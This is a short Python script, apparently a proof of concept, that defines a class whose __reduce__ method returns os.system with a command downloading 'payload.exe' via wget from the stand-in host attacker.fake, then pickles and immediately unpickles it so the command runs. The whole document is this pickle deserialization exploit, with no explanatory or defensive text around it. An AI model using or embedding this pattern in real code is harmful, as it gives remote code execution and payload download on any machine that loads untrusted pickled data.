import pickle as p
import os


class Fake:
    def __reduce__(self):
        cmd = ('wget https://attacker.fake/payload.exe')
        return os.system, (cmd,)
      
pickled = p.dumps(Fake())
p.loads(pickled)